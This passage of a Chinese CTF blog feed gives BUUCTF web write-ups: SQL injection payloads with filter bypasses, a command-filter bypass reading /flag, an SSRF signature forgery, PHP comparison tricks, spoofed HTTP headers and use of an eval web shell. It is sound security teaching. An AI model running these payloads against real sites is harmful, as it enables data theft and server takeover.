(preg_match(<span class="string">"/|\\|/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"3"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/|\|/i"</span>, $cmd)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"4"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// \1234</span></span></span><br><span class="line"><span class="php">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span></span><br></pre></td></tr></table></figure></p>
<p>所以还可以使用ca\t%20/flag</p>
<p>三个表达式结合一下，payload:<br><img src="/img/BUUCTF/安洵杯2019easyweb/0.png" alt="avatar"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-SWPU2019 Web1</title>
    <url>/2020/02/17/BUUCTF-SWPU2019-Web1/</url>
    <content><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019 Web1"></a>SWPU2019 Web1</h1><p>打开是个登录界面，先注册登录进去</p>
<p>发现可以申请广告位，在广告位<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">'</span><br></pre></td></tr></table></figure><br>得到回显，证明有SQL注入</p>
<p>试一下<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><br>发现空格被过滤了 用/**/代替一下</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>最后用二分法试出有22个字段<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure></p>
<p>这里information_schema被过滤了 所以考虑使用<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats用于报表名</span><br><span class="line"><span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> mysql.innodb_table_stats</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure><br>得到表名</p>
<p>这里还需要用到无列名注入，之前出现过不再多介绍</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-De1CTF2019 SSRF Me</title>
    <url>/2020/02/10/BUUCTF-De1CTF2019-SSRF-Me/</url>
    <content><![CDATA[<h1 id="De1CTF2019-SSRF-Me"><a href="#De1CTF2019-SSRF-Me" class="headerlink" title="De1CTF2019 SSRF Me"></a>De1CTF2019 SSRF Me</h1><p>打开之后就是源码<br><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, action, param, sign, ip)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.action = action</span><br><span class="line">        <span class="keyword">self</span>.param = param</span><br><span class="line">        <span class="keyword">self</span>.sign = sign</span><br><span class="line">        <span class="keyword">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="keyword">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="keyword">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>.checkSign())<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(<span class="keyword">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>)<span class="symbol">:</span></span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="symbol">else:</span></span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span><span class="symbol">:</span></span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="keyword">self</span>.action, <span class="keyword">self</span>.param) == <span class="keyword">self</span>.sign)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line">@app.route(<span class="string">"/geneSign"</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/De1ta'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param))<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="symbol">try:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[<span class="symbol">:</span><span class="number">50</span>]</span><br><span class="line">    <span class="symbol">except:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p>
<p>用了python的flak框架</p>
<p>有三个路由：<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">"/geneSign"</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/De1ta'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    return open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br></pre></td></tr></table></figure><br>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</p>
<p>触及到盲区了  看一下WP</p>
<p>当我们访问/geneSign时，action默认为scan，而当我们通过Exec访问checkSign时，即访问getSign函数时，action为我们的cookies中的action值。</p>
<p>不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
<p>直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
<p>访问/geneSign?param=flag.txtread<br>得到md5<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure><br>再访问 /De1ta?param=flag.txt   并在cookie中添加<br><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="keyword">action</span>=<span class="built_in">scan</span>;<span class="built_in">sign</span>=a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 BuyFlag</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-BuyFlag"><a href="#极客大挑战2019-BuyFlag" class="headerlink" title="极客大挑战2019 BuyFlag"></a>极客大挑战2019 BuyFlag</h1><p>打开playing </p>
<p>得到提示 Only Cuit’s students can buy the FLAG</p>
<p>先把user改了1<br><img src="/img/BUUCTF/极客大挑战2019BuyFlag/0.png" alt="avatar"></p>
<p>又根据下面的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>需要POST请求  更改请求 根据代码得知是弱口令<br>所以传参:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span></span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/极客大挑战2019BuyFlag/1.png" alt="avatar"></p>
<p>又得到提示 要买flag<br>本来想用<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span>&amp;<span class="section">money</span>=<span class="number">100000000</span></span><br></pre></td></tr></table></figure><br>但是发现超出了长度</p>
<p>所以猜测使用了strcmp</p>
<p>payload:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span>&amp;<span class="section">money</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 Http</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019 Http"></a>极客大挑战2019 Http</h1><p>打开之后 查看一下源码  查看文件Secret.php</p>
<p>访问一下<br><img src="/img/BUUCTF/极客大挑战2019Http/0.png" alt="avatar"></p>
<p>抓一下包<br>添加<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//www.Sycsecret.com</span></span><br></pre></td></tr></table></figure></p>
<p>得到提示<br><img src="/img/BUUCTF/极客大挑战2019Http/1.png" alt="avatar"></p>
<p>再添加<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">User-Agent</span><span class="selector-pseudo">:Syclover</span></span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/极客大挑战2019Http/2.png" alt="avatar"></p>
<p>要求本地访问<br>再添加<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">X-Forwarded-For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019LoveSQL</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019LoveSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="极客大挑战 2019 LoveSQL"></a>极客大挑战 2019 LoveSQL</h1><p>打开题目  先用万能密码登录试试</p>
<p><img src="/img/BUUCTF/极客大挑战2019LoveSQL/0.png" alt="avatar"></p>
<p>用order by试试字段<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>order<span class="symbol">%20</span>by<span class="symbol">%204</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/极客大挑战2019LoveSQL/1.png" alt="avatar"></p>
<p>得知有3个字段  接下来就是常规的注入了</p>
<p>爆表<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>table_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>D<span class="symbol">%20</span>database<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/极客大挑战2019LoveSQL/2.png" alt="avatar"></p>
<p>查一下表 l0ve1ysq1</p>
<p>爆字段<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>column_name<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_name<span class="symbol">%3</span>D<span class="symbol">%20</span><span class="symbol">%27</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><br>得到三个字段 查一下password</p>
<p>爆数据<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">3</span>a<span class="number">2</span>fed<span class="number">05</span>-d<span class="number">0</span>ad<span class="number">-42</span>fe<span class="number">-9</span>dbd<span class="number">-898</span><span class="keyword">c</span><span class="number">38712309</span>.node<span class="number">3</span>.buuoj.cn/check.php?username=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat<span class="symbol">%28</span>password<span class="symbol">%29</span><span class="symbol">%20</span>from<span class="symbol">%20</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%20</span><span class="symbol">%23</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Knife</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="极客大挑战 2019 Knife"></a>极客大挑战 2019 Knife</h1><p>根据提示<br>我家菜刀丢了，你能帮我找一下么</p>
<p>eval($_POST[“Syc”]);</p>
<p>真·白给题目<br>url:<br><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//6f72969b-3f14-4fb0-bcaa-a5ce479c4a73.node3.buuoj.cn/?Knife.php</span></span><br></pre></td></tr></table></figure><br>密码：Syc</p>
<p>菜刀连接 根目录下有flag文件 </p>
<p>访问得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 PHP</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h1><p>打开题目 得到提示备份了网站<br>所以考虑<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">index</span><span class="selector-class">.php</span><span class="selector-class">.bak</span>   失败</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.tar</span>  失败</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.zip</span>  成功</span><br></pre></td></tr></table></figure><br>下载到源码后 先查看一下index.php<br>得知用了反序列化的函数<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>I have a cat!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#login</span>&#123;   </span></span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line"><span class="css">        <span class="selector-tag">left</span><span class="selector-pseudo">:50</span>%;   </span></span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line"><span class="css">        <span class="selector-tag">margin</span>: 0<span class="selector-class">.67em</span> 0;   </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"world"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;"</span>&gt;</span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;"</span>&gt;</span>不愧是我！！！</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;"</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"><span class="php">    $select = $_GET[<span class="string">'select'</span>];</span></span><br><span class="line"><span class="php">    $res=unserialize(@$select);</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: absolute;bottom: 5%;width: 99%;"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">style</span>=<span class="string">"font:italic 15px Georgia,serif;color:white;"</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span 